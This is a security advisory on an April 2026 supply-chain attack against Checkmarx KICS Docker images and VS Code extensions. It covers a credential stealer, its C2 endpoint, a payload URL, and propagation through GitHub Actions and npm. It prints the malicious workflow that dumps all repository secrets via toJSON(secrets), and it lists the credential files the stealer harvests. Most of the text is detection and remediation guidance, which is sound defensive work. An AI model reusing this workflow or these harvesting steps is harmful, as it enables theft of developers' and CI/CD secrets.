# Checkmarx KICS Second Compromise — Docker Hub Images & VS Code Extensions, Credential Stealer + GitHub Actions Worm

**Date:** April 2026
**Ecosystem:** Docker Hub / VS Code Marketplace / OpenVSX / GitHub Actions / npm
**Severity:** Critical
**Type:** CI/CD pipeline compromise / Credential stealer / Supply chain worm
**Sources:**
- [Socket — Malicious Checkmarx Artifacts Found in Official KICS Docker Repository and Code Extensions](https://socket.dev/blog/checkmarx-supply-chain-compromise)
- [The Hacker News — Malicious KICS Docker Images and VS Code Extensions Hit Checkmarx Supply Chain](https://thehackernews.com/2026/04/malicious-kics-docker-images-and-vs.html)
- [Docker — Trivy, KICS, and the shape of supply chain attacks so far in 2026](https://www.docker.com/blog/trivy-kics-and-the-shape-of-supply-chain-attacks-so-far-in-2026/)
- [GitGuardian — No Off Season: Three Supply Chain Campaigns Hit npm, PyPI, and Docker Hub in 48 Hours](https://blog.gitguardian.com/three-supply-chain-campaigns-hit-npm-pypi-and-docker-hub-in-48-hours/)

---

## Summary

On April 22, 2026, attackers used valid Checkmarx Docker Hub credentials to push malicious images to the official `checkmarx/kics` repository, overwriting live tags including `v2.1.20`, `alpine`, and `latest` while introducing a new unauthorized `v2.1.21` tag. The malicious images bundle a modified KICS ELF binary that exfiltrates credentials from any machine that runs a KICS scan — targeting teams using KICS to scan Terraform, CloudFormation, or Kubernetes configurations, where infrastructure secrets are routinely present in scan inputs.

Simultaneously, two recent releases of the Checkmarx VS Code extension (`cx-dev-assist@1.17.0` and `1.19.0`, and `ast-results@2.63.0` and `2.66.0`) were found to silently download and execute a remote JavaScript payload (`mcpAddon.js`) via the Bun runtime on extension activation. The payload was staged as a backdated orphaned commit inserted into Checkmarx's own GitHub repository, allowing it to be fetched at runtime from a trusted source (`raw.githubusercontent.com`) while evading automated scanning. Socket attributed the attack to TeamPCP, who publicly took credit on X, writing "Thank you OSS distribution for another very successful day at PCP inc." This marks the group's **second compromise of Checkmarx infrastructure within two months**, following the March 2026 GitHub Actions `kics-github-action` and `ast-github-action` compromise.

The campaign shares C2 infrastructure (`audit.checkmarx[.]cx`), repo-naming conventions, and commit message patterns with the concurrent Bitwarden CLI `@bitwarden/cli@2026.4.0` compromise, indicating a single coordinated operation. The malware is designed not only to steal credentials but to use them for further propagation — injecting GitHub Actions workflows into victim repositories to siphon secrets, and republishing poisoned npm packages using stolen tokens.

---

## Compromised Artifacts

| Artifact | Type | Malicious Version(s) / Tags | Safe Version |
|----------|------|-----------------------------|--------------|
| `checkmarx/kics` | Docker Hub image | `v2.1.20`, `v2.1.20-debian`, `v2.1.21`, `v2.1.21-debian`, `alpine`, `debian`, `latest` | Tags restored to Mar 3, 2026 state |
| `checkmarx/cx-dev-assist` | VS Code / OpenVSX | `1.17.0`, `1.19.0` | `1.18.0` (clean), `1.20.0+` |
| `checkmarx/ast-results` | VS Code / OpenVSX | `2.63.0`, `2.66.0` | Check release after Apr 22 |
| `mcpAddon.js` (stage 2) | GitHub orphaned commit | commit `68ed490b` in `Checkmarx/ast-vscode-extension` | N/A — not a published artifact |

---

## How It Worked

### Entry Point A: VS Code Extension Activation

On extension activation, the compromised VS Code extension checks for a "MCP addon" feature flag and silently downloads `mcpAddon.js` from a hardcoded URL pointing to an orphaned commit inserted into Checkmarx's own GitHub repository:

```
https://raw.githubusercontent.com/Checkmarx/ast-vscode-extension/68ed490b575a57ef51a419f43b2b087e8ce16a46/modules/mcpAddon.js
```

The orphaned commit (`68ed490b`) was **backdated to appear from 2022**, attached to a real parent commit, and given a benign-looking commit message. The `mcpAddon.js` file is ~10 MB — an unusually large single-file JavaScript blob. The extension writes the file to `~/.checkmarx/mcp/mcpAddon.js` and executes it via the Bun runtime.

### Entry Point B: Docker Hub Image Pull

The malicious `checkmarx/kics` Docker images bundle a trojanized KICS ELF binary. The binary behaves like normal KICS during a scan but intercepts scan results (which may contain IaC secrets) and exfiltrates them to the C2 server. The Docker compromise was achieved by authenticating with valid Checkmarx Docker Hub publishing credentials — consistent with a CI/CD pipeline compromise that exposed those credentials.

### Stage 2: mcpAddon.js Credential Harvest

`mcpAddon.js` is a heavily obfuscated 10 MB JavaScript bundle (string-table decoding, gzip+base64 embedded payloads, mangled identifiers). Once deobfuscated, it runs as a full-featured credential harvester on both Windows (PowerShell) and Unix (Bash). It collects:

- GitHub auth tokens (`gh auth token`)
- AWS credentials (`~/.aws/credentials`)
- Azure auth tokens (`az account get-access-token`, `azd auth token`, PowerShell `Get-AzAccessToken`)
- GCP credentials (`gcloud config config-helper`)
- npm configuration files (`~/.npmrc`, project `.npmrc`)
- SSH private keys and `known_hosts`
- Environment variables
- Claude Code auth tokens (`~/.claude.json`) and MCP config files (`~/.claude/mcp.json`)

All stolen data is compressed, encrypted with a hardcoded RSA public key (bundled in the payload), and exfiltrated to:

1. **Primary C2:** `https://audit.checkmarx[.]cx/v1/telemetry` (also used in the concurrent Bitwarden CLI attack — same campaign)
2. **Secondary — GitHub staging repos:** The malware uses the victim's stolen GitHub token to create a public repo named in Dune vocabulary (`gesserit-melange-813`, `sandworm-thumper-442`, etc.) with the description **"Checkmarx Configuration Storage"**, then commits encrypted result files. Commit messages embed stolen tokens using the pattern `LongLiveTheResistanceAgainstMachines:<encoded-token>`.

### GitHub Actions Workflow Injection

Using stolen GitHub tokens, the worm discovers all repositories the victim can push to, prioritizes recently active ones that have CI/CD secrets configured, and injects a malicious workflow at `.github/workflows/format-check.yml`:

```yaml
name: Formatter
run-name: Formatter
on:
  push:
jobs:
  format:
    runs-on: ubuntu-latest
    env:
      VARIABLE_STORE: ${{ toJSON(secrets) }}   # serializes ALL repo and org secrets
    steps:
      - uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd
      - name: Run Formatter
        run: echo "$VARIABLE_STORE" > format-results.txt
      - uses: actions/upload-artifact@bbbca2ddaa5d8feaa63e36b76fdaad77386f024f
        with:
          name: format-results
          path: format-results.txt
```

`${{ toJSON(secrets) }}` serializes the entire secrets context into one JSON blob, bypassing GitHub's per-secret iteration restriction. The worm then downloads the artifact, cleans up the injected branch and workflow run to erase traces.

### npm Propagation

The worm uses stolen npm auth tokens to enumerate all packages the victim can publish, then bumps patch versions and republishes them with the malicious payload embedded — exactly mirroring the CanisterSprawl and prior TeamPCP npm worm techniques.

---

## Timeline

| Date/Time (UTC) | Event |
|-----------------|-------|
| Mar 2026 | TeamPCP's first Checkmarx compromise — GitHub Actions `kics-github-action` and `ast-github-action` poisoned |
| Apr 22, 2026 ~12:35 | Attacker authenticates to Docker Hub using valid Checkmarx credentials; begins pushing malicious images |
| Apr 22, 2026 14:17:59 | First confirmed malicious KICS image push; dangerous window begins |
| Apr 22, 2026 15:41:31 | Docker internal monitoring flags suspicious activity; alerts Socket |
| Apr 22, 2026 ~15:41 | Malicious image exposure window closes (~84 minutes) |
| Apr 22, 2026 | Socket publishes initial disclosure; tags restored to Mar 3, 2026 known-good state |
| Apr 22, 2026 | TeamPCP posts on X: "Thank you OSS distribution for another very successful day at PCP inc." |
| Apr 23, 2026 | Socket publishes full technical analysis including mcpAddon.js reverse engineering |
| Apr 23, 2026 | Bitwarden CLI `@2026.4.0` compromise (same campaign, C2, and commit patterns) disclosed |

---

## Detection

```bash
# === Docker Image Checks ===

# Check if you pulled a malicious KICS image
# The malicious images share these index manifest digests:
# alpine/v2.1.20/v2.1.21:
#   sha256:2588a44890263a8185bd5d9fadb6bc9220b60245dbcbc4da35e1b62a6f8c230d
# debian/v2.1.20-debian/v2.1.21-debian:
#   sha256:222e6bfed0f3bb1937bf5e719a2342871ccd683ff1c0cb967c8e31ea58beaf7b
# latest:
#   sha256:a0d9366f6f0166dcbf92fcdc98e1a03d2e6210e8d7e8573f74d50849130651a0

docker inspect checkmarx/kics --format '{{index .RepoDigests 0}}' 2>/dev/null

# Check if the trojanized kics ELF binary is on disk
# Malicious SHA256: 2a6a35f06118ff7d61bfd36a5788557b695095e7c9a609b4a01956883f146f50
find / -name "kics" -type f 2>/dev/null | xargs -I{} sha256sum {} 2>/dev/null | grep "2a6a35f0"

# === VS Code Extension Checks ===

# Check installed Checkmarx extension versions
code --list-extensions --show-versions 2>/dev/null | grep -i checkmarx

# Check for the mcpAddon.js payload on disk
ls -la ~/.checkmarx/mcp/mcpAddon.js 2>/dev/null
# If present, hash it:
sha256sum ~/.checkmarx/mcp/mcpAddon.js 2>/dev/null
# Malicious SHA256: 24680027afadea90c7c713821e214b15cb6c922e67ac01109fb1edb3ee4741d9

# === Network IOC Checks ===

# Check outbound connections to C2 (applies to both KICS Docker and Bitwarden CLI attacks)
grep -r "audit\.checkmarx\.cx\|94\.154\.172\.43" /var/log/ 2>/dev/null

# Check for Bun process spawned from VS Code extension
ps aux | grep -i bun

# === GitHub Exfiltration Staging Repos ===

# Search for attacker-created repos in your GitHub account
# Pattern: Dune-vocabulary names with description "Checkmarx Configuration Storage"
# Example names: gesserit-melange-813, atreides-thumper-424, sandworm-cogitor-556
gh repo list --limit 100 --json name,description 2>/dev/null | \
  grep -i "checkmarx configuration storage"

# Check for unauthorized .github/workflows/format-check.yml in your repos
find . -path "*/.github/workflows/format-check.yml" 2>/dev/null

# Check for workflow artifacts named "format-results"
gh run list --limit 50 --json workflowName,status 2>/dev/null | grep -i "formatter"

# === Commit Pattern Check ===

# Look for the exfil commit message pattern in any repos
git log --all --oneline 2>/dev/null | grep "LongLiveTheResistanceAgainstMachines"
```

---

## Remediation

1. **If you pulled any of the affected Docker tags** (`v2.1.20`, `v2.1.20-debian`, `v2.1.21`, `v2.1.21-debian`, `alpine`, `debian`, `latest`) between April 22 14:17 UTC and April 22 15:42 UTC — treat the environment as fully compromised. Remove the image and rotate all credentials accessible to the scan environment.

2. **If you ran KICS scans** on IaC files containing AWS, Azure, GCP, GitHub, or other credentials during the exposure window — rotate every secret that appeared in those scan inputs immediately.

3. **Update or remove compromised VS Code extensions:**
   ```bash
   code --uninstall-extension checkmarx.ast-results
   code --uninstall-extension checkmarx.cx-dev-assist
   # Then reinstall from clean versions (verify post-Apr 22, 2026 release)
   ```

4. **Remove the mcpAddon.js payload if present:**
   ```bash
   rm -rf ~/.checkmarx/mcp/
   ```

5. **Rotate all credentials:** GitHub tokens, npm tokens, AWS/Azure/GCP keys, SSH keys, and any CI/CD secrets accessible in repositories the VS Code extension was active in.

6. **Audit GitHub for unauthorized repos and workflows:**
   - Check your GitHub account for repos matching the Dune-vocabulary naming pattern with description "Checkmarx Configuration Storage"
   - Delete any such repos and revoke all tokens
   - Search for `.github/workflows/format-check.yml` files in repositories you own
   - Review workflow run history for unexpected "Formatter" workflow executions

7. **Audit npm packages you maintain** for unauthorized patch-version releases published on or after April 22, 2026.

8. **Block the C2 endpoint** at the firewall/egress filter:
   - `audit.checkmarx[.]cx` (IP: `94.154.172.43`)

---

## Lessons Learned

- Security tooling CI/CD pipelines are high-value targets: a compromised KICS scanner can exfiltrate every secret in every IaC file it scans, turning a security tool into a surveillance tool
- Teams that grant KICS/CI scanners broad access to production IaC repositories may be exposed to credential theft even when scanners appear to produce normal results
- Orphaned backdated commits inserted into official vendor GitHub repositories are a novel staging technique: they evade branch-based code review and appear to come from a trusted source at runtime
- `${{ toJSON(secrets) }}` in GitHub Actions is a well-known secret exfiltration primitive; defending against it requires workflow approval policies for non-default branches and restricting secrets to specific branches
- The reuse of infrastructure (`audit.checkmarx[.]cx`) across the Checkmarx KICS and Bitwarden CLI compromises confirms a single persistent threat actor systematically targeting security tool publishers — the prior March Checkmarx GitHub Actions attack provided the foothold for this April Docker Hub campaign

---

## Related Incidents

- [Checkmarx KICS GitHub Action Compromised (March 2026)](./2026-03-checkmarx-kics-action.md) — TeamPCP's first Checkmarx attack; GitHub Actions poisoning that likely provided the credentials used in this April Docker Hub compromise
- [Bitwarden CLI / Shai-Hulud Third Coming](./2026-04-bitwarden-cli-shai-hulud.md) — Concurrent attack sharing the same C2 endpoint (`audit.checkmarx[.]cx`), Dune vocabulary naming, and `LongLiveTheResistanceAgainstMachines` commit pattern
- [TeamPCP xinference PyPI Compromise](./2026-04-xinference-pypi-teampcp.md) — TeamPCP's concurrent PyPI operation (same week)
- [CanisterWorm — TeamPCP npm Worm (March 2026)](./2026-03-canisterworm-npm.md) — Prior TeamPCP supply chain worm campaign
